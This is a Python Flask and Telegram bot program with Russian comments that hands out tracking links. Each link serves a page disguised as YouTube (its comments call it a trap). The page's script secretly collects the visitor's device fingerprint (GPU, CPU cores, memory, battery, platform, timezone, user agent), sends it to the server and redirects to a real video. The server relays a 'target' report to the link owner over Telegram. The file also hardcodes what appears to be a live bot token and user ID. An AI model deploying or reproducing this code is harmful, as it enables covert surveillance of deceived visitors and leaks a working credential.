import threading
import requests
import json
import os
import base64
import time
import sqlite3
from flask import Flask, render_template_string, request

# =================================================================
# [1] CONFIG
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)')
    conn.commit()
    conn.close()

def get_owner(sid):
    try:
        conn = sqlite3.connect('phantom.db', check_same_thread=False)
        res = conn.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,)).fetchone()
        conn.close()
        return res[0] if res else OVERLORD_ID
    except: return OVERLORD_ID

# [2] КОРЕНЬ ДЛЯ КРОНА (Оставил как раньше)
@app.route('/')
def index():
    return "service active", 200

# [3] ЛОВУШКА (БЕЗ БЛОКИРОВКИ)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; cursor:pointer; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"></div>
<script>
    function ignite() {
        // 1. Собираем всё, что доступно МГНОВЕННО
        var info = {
            sid: "{{sid}}",
            ua: navigator.userAgent,
            res: screen.width + "x" + screen.height,
            plat: navigator.platform,
            mem: navigator.deviceMemory || "N/A",
            cores: navigator.hardwareConcurrency || "N/A",
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            bat: "N/A"
        };

        // 2. Пробуем вытянуть GPU (синхронно)
        try {
            var gl = document.createElement('canvas').getContext('webgl');
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
        } catch(e) { info.gpu = "N/A"; }

        // 3. Батарея (БЕЗ await, через callback)
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                info.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
                // Досылаем уточненные данные, если успеем
                navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
            });
        }

        // 4. Основной выстрел данными (сразу)
        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
        
        // 5. МГНОВЕННЫЙ РЕДИРЕКТ
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
</script>
</body>
</html>
"""

# [4] ПРИЕМ И ОТЧЕТ
@app.route('/v/<sid>')
def serve(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        d = json.loads(raw)
        sid = str(d.get('sid'))
        
        report = (
            f"<b>🚀 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
            f"<b>🎮 GPU:</b> <code>{d.get('gpu')}</code>\n"
            f"<b>🧠 CPU:</b> <code>{d.get('cores')} Cores</code>\n"
            f"<b>💾 RAM:</b> <code>{d.get('mem')} GB</code>\n"
            f"<b>📱 OS:</b> <code>{d.get('plat')}</code>\n"
            f"<b>📐 Res:</b> <code>{d.get('res')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🛰 <b>UA:</b> <code>{d.get('ua')[:100]}...</code>"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": get_owner(sid), "text": report, "parse_mode": "HTML"})
    except: pass
    return "OK"

# [5] BOT THREAD
def bot_loop():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if msg and "text" in msg:
                    cid = msg["chat"]["id"]
                    if msg["text"] == "/start":
                        save_link(str(cid), cid)
                        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                      json={"chat_id": cid, "text": f"✅ <b>Система в норме.</b>\n\nСсылка:\n<code>{BASE_URL}/v/{cid}</code>", "parse_mode": "HTML"})
        except: time.sleep(5)

def save_link(sid, owner_id):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
    conn.commit()
    conn.close()

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
